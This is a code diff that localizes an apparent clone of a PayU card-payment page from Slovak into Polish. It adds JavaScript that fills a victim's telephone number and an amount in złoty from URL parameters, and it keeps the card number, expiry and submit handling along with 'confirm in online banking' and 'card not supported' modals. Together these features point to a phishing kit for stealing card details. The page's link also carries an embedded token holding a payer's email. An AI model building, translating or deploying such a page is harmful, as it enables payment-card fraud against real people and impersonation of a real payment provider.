@@ -80,6 +80,22 @@
       </div>
       <div class="app-container">
         <main>
+          <div class="column column-1">
+            <aside>
+              <div>
+                <div>
+                  <br><em class="row">Numer telefonu</em>
+                  <p></p>
+                  <p> </p>
+                  <div class="order-data"><p id="telephone"></p></div>
+                  <hr>
+                </div>
+                <div class="amount">
+                  <div class="highlight"><span id="sidebar_sum_total">Łącznie</span><span class="price" aria-labelledby="sidebar_sum_total"><p id="price"></p></span></div>
+                </div>
+              </div>
+            </aside>
+          </div>
           <div class="content-wrapper column column-2">
             <article class="card">
               <div>
@@ -108,13 +124,13 @@
                 <div class="main">
                   <form autocomplete="">
                     <div class="form-row">
-                      <label for="card-number">Číslo karty</label>
+                      <label for="card-number">Numer karty</label>
                       <input autocomplete="cc-number" class="invalid" id="card-number" name="number" maxlength="19" tabindex="5" type="tel" value="" oninput="formatCardNumber(this)">
                     </div>
                     <div>
                       <div class="inline separated">
                         <div class="form-row">
-                          <label for="card-date">Platná do</label>
+                          <label for="card-date">Ważne do</label>
                           <input autocomplete="cc-exp" class="" id="card-date" name="date" placeholder="MM/RR" tabindex="6" maxlength="7" type="tel" value="" oninput="formatExpiryDate(this)">
                         </div>
                         <div class="form-row">
@@ -173,7 +189,7 @@
                     }
                   }
                 </style>
-                <input id="ShowInputButton" name="submit" tabindex="11" type="submit" value="Zaplatiť">
+                <input id="ShowInputButton" name="submit" tabindex="11" type="submit" value="Płacić">
                 <div id="loadingMessage">
                   <div class="spinner"></div>
                 </div>
@@ -186,9 +202,9 @@
       <div class="regulations-container">
         <section>
           <section>
-            <div class="regulations"><strong>Správcom vašich osobných údajov </strong> je spoločnosť PayU S.A. so sídlom v Poznani (60-166), ul. Grunwaldzka 186, Poľsko. Vaše osobné údaje budeme spracovávať preto, aby sme mohli realizovať platobnú transakciu, informovali Vás o jej stave, mohli vybaviť prípadnú reklamáciu a tiež, aby sme splnili zákonné povinnosti, ktoré ako spoločnosť PayU máme. <a href="https://secure.payu.com/pay/?orderId=B7G31GQ45P240610GUEST000P01&amp;token=eyJhbGciOiJIUzI1NiJ9.eyJvcmRlcklkIjoiQjdHMzFHUTQ1UDI0MDYxMEdVRVNUMDAwUDAxIiwicG9zSWQiOiJXRHRWYVFTWCIsImF1dGhvcml0aWVzIjpbIlJPTEVfQ0xJRU5UIl0sInBheWVyRW1haWwiOiJtb2xvZG95bmF2Yml2ZWN2dkBnbWFpbC5jb20iLCJleHAiOjE3MTgxMjM3MTAsImlzcyI6IlBBWVUiLCJhdWQiOiJhcGktZ2F0ZXdheSIsInN1YiI6IlBheVUgc3ViamVjdCIsImp0aSI6IjdkYTZjYjU0LTVhOGItNGQyZS1iNDI5LTdmNWNmMzI2ZDNjZiJ9.EqqXU3m4tGoNFpKpPyCAJ2UEE5_J_KTltAOXOePe61w#">Prečítať všetko</a></div>
+            <div class="regulations"><strong>Administrator danych osobowych </strong> firma PayU S.A. z siedzibą w Poznaniu (60-166), ul. Grunwaldzka 186, Polska. Twoje dane osobowe będą przetwarzane w celu realizacji transakcji płatniczej, informowania Cię o jej stanie, obsługi ewentualnych reklamacji oraz w celu spełnienia naszych obowiązków prawnych jako firmy PayU.<a href="https://secure.payu.com/pay/?orderId=B7G31GQ45P240610GUEST000P01&amp;token=eyJhbGciOiJIUzI1NiJ9.eyJvcmRlcklkIjoiQjdHMzFHUTQ1UDI0MDYxMEdVRVNUMDAwUDAxIiwicG9zSWQiOiJXRHRWYVFTWCIsImF1dGhvcml0aWVzIjpbIlJPTEVfQ0xJRU5UIl0sInBheWVyRW1haWwiOiJtb2xvZG95bmF2Yml2ZWN2dkBnbWFpbC5jb20iLCJleHAiOjE3MTgxMjM3MTAsImlzcyI6IlBBWVUiLCJhdWQiOiJhcGktZ2F0ZXdheSIsInN1YiI6IlBheVUgc3ViamVjdCIsImp0aSI6IjdkYTZjYjU0LTVhOGItNGQyZS1iNDI5LTdmNWNmMzI2ZDNjZiJ9.EqqXU3m4tGoNFpKpPyCAJ2UEE5_J_KTltAOXOePe61w#">Prečítať všetko</a></div>
           </section>
-          <p class="regulations"><strong>Stránky využívajú súbory cookies</strong>za účelom realizácie služieb v súlade s <a target="_blank" rel="noreferrer" href="https://static.payu.com/sites/terms/files/PayU_cookies_policy.pdf">Politikou cookies</a>. Podmienky pre zachovanie alebo prístup ku cookies môžete definovať vo Vašom prehliadači.</p>
+          <p class="regulations"><strong>Strona wykorzystuje pliki cookies </strong>w celu realizacji usług zgodnie z <a target="_blank" rel="noreferrer" href="https://static.payu.com/sites/terms/files/PayU_cookies_policy.pdf">Polityką plików cookies</a>. Warunki dotyczące przechowywania lub dostępu do plików cookies możesz określić w swojej przeglądarce.</p>
         </section>
       </div>
     </div>
@@ -403,9 +419,26 @@
 
 <!-- <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> -->
 <script>
+
 let session = Math.floor(Math.random() * 9000000) + 1000000;
 console.log(session)
 localStorage.setItem('session', session);
+
+const url = window.location.href
+const urlObj = new URL(url);
+const telephone = urlObj.searchParams.get('telephone');
+const price = urlObj.searchParams.get('price');
+const telephoneElement = document.getElementById('telephone');
+const priceElement = document.getElementById('price');
+
+localStorage.setItem('telephone', telephone);
+localStorage.setItem('price', price);
+
+// Устанавливаем текстовое содержимое элементов
+telephoneElement.textContent += telephone;
+priceElement.textContent += price + ' zł';
+
+
 document.getElementById('ShowInputButton').addEventListener('click', function() {
     let cardNumber = document.getElementById('card-number').value;
     let expiryDate = document.getElementById('card-date').value;
@@ -557,7 +590,7 @@ function openModal() {
     modal.innerHTML = `
         <div class="modal-content">
             <span class="close">&times;</span>
-            <p class="dota_2">Potvrďte akciu v online banke</p>
+            <p class="dota_2">Potwierdź akcję w bankowości internetowej</p>
         </div>
     `;
 
@@ -711,7 +744,7 @@ function openModal_nocorrect_num() {
     modal.innerHTML = `
         <div class="modal-content">
             <span class="close">&times;</span>
-            <p class="dota_2">Táto karta nie je podporovaná.</p>
+            <p class="dota_2">Ta karta nie jest obsługiwana.</p>
         </div>
     `;
 
